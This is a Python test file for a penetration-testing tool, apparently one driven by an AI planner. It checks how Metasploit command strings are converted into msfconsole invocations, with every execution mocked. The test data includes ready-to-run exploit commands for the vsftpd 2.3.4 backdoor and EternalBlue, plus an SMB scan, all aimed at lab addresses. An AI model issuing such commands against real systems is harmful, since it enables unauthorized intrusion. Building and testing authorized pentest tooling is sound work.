"""
Tests for Metasploit command conversion in ToolExecutor
"""

from unittest.mock import AsyncMock, patch

import pytest

from wish_tools.execution.executor import ToolExecutor


class TestMetasploitConversion:
    """Test cases for Metasploit command format conversion"""

    def setup_method(self):
        """Set up test fixtures"""
        self.executor = ToolExecutor()

    @pytest.mark.asyncio
    async def test_legacy_metasploit_command_conversion(self):
        """Test conversion of legacy Metasploit command format"""
        legacy_command = "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 10.10.10.3; run"

        # Mock the msfconsole executor
        with patch.object(self.executor.msfconsole_executor, "execute_msfconsole_command") as mock_exec:
            mock_exec.return_value = ("[*] Started reverse TCP handler\n", "", 0)

            result = await self.executor.execute_command(legacy_command, "metasploit")

        # Verify msfconsole executor was called with converted command
        mock_exec.assert_called_once()
        call_args = mock_exec.call_args
        assert call_args[1]["command"] == "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 10.10.10.3; run; exit"

        # Verify result
        assert result.success
        assert result.tool_name == "metasploit"
        assert "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 10.10.10.3; run; exit" in result.command

    @pytest.mark.asyncio
    async def test_proper_msfconsole_command_not_converted(self):
        """Test that properly formatted msfconsole commands are handled by specialized executor"""
        proper_command = (
            'msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.1; run; exit"'
        )

        # Mock the msfconsole executor
        with patch.object(self.executor.msfconsole_executor, "execute_msfconsole_command") as mock_exec:
            mock_exec.return_value = ("[*] Exploit completed\n", "", 0)

            result = await self.executor.execute_command(proper_command, "msfconsole")

        # Verify msfconsole executor was called with extracted command
        mock_exec.assert_called_once()
        call_args = mock_exec.call_args
        # The command should be extracted from the msfconsole -x format
        assert (
            "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.1; run; exit" in call_args[1]["command"]
        )

        # Verify result
        assert result.success
        assert result.tool_name == "msfconsole"

    @pytest.mark.asyncio
    async def test_metasploit_command_with_multiple_statements(self):
        """Test conversion of complex legacy Metasploit commands"""
        complex_command = "use auxiliary/scanner/smb/smb_version; set RHOSTS 10.10.10.0/24; set THREADS 10; run"

        # Mock the msfconsole executor
        with patch.object(self.executor.msfconsole_executor, "execute_msfconsole_command") as mock_exec:
            mock_exec.return_value = ("[*] Exploit running\n", "", 0)

            await self.executor.execute_command(complex_command, "metasploit")

        # Verify msfconsole executor was called with converted command
        mock_exec.assert_called_once()
        call_args = mock_exec.call_args
        expected_command = "use auxiliary/scanner/smb/smb_version; set RHOSTS 10.10.10.0/24; set THREADS 10; run; exit"
        assert call_args[1]["command"] == expected_command

    @pytest.mark.asyncio
    async def test_non_metasploit_use_command_not_converted(self):
        """Test that 'use' commands for other tools are not converted"""
        command = "use something"

        # Mock regular subprocess execution
        mock_process = AsyncMock()
        mock_process.communicate = AsyncMock(return_value=(b"output\n", b""))
        mock_process.returncode = 0

        with patch("asyncio.create_subprocess_shell", return_value=mock_process) as mock_create:
            result = await self.executor.execute_command(command, "someothertool")

        # Verify command was NOT converted and regular execution was used
        mock_create.assert_called_once()
        actual_command = mock_create.call_args[0][0]
        assert actual_command == command

        # Verify tool name was not changed
        assert result.tool_name == "someothertool"

    @pytest.mark.asyncio
    async def test_metasploit_command_execution_success(self):
        """Test successful execution of Metasploit command"""
        legacy_command = "use exploit/test; run"

        # Mock the msfconsole executor
        with patch.object(self.executor.msfconsole_executor, "execute_msfconsole_command") as mock_exec:
            mock_exec.return_value = ("[*] Exploit successful\n", "", 0)

            result = await self.executor.execute_command(legacy_command, "metasploit")

        # Verify successful execution
        assert result.success
        assert result.tool_name == "metasploit"
        assert "use exploit/test; run; exit" in result.command


class TestPlanStepConversion:
    """Test cases for PlanStep Metasploit command conversion"""

    def test_plan_step_metasploit_conversion(self):
        """Test that PlanStep converts Metasploit commands to executable format"""
        from wish_ai.planning.generator import PlanGenerator

        generator = PlanGenerator(None)  # No LLM needed for this test

        # Test data with legacy Metasploit command
        step_data = {
            "tool_name": "exploit",  # Wrong tool name
            "command": "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 10.10.10.3; run",
            "purpose": "Exploit vsftpd backdoor",
            "expected_result": "Shell access",
        }

        # Parse the step
        step = generator._parse_plan_step(step_data)

        # Verify conversion
        assert step.tool_name == "msfconsole"
        assert (
            step.command
            == 'msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 10.10.10.3; run; exit"'
        )

    def test_plan_step_proper_format_not_converted(self):
        """Test that properly formatted msfconsole commands are not converted"""
        from wish_ai.planning.generator import PlanGenerator

        generator = PlanGenerator(None)

        # Test data with proper msfconsole command
        step_data = {
            "tool_name": "msfconsole",
            "command": (
                'msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.1; run; exit"'
            ),
            "purpose": "Exploit EternalBlue",
            "expected_result": "System access",
        }

        # Parse the step
        step = generator._parse_plan_step(step_data)

        # Verify no conversion
        assert step.tool_name == "msfconsole"
        assert step.command == step_data["command"]
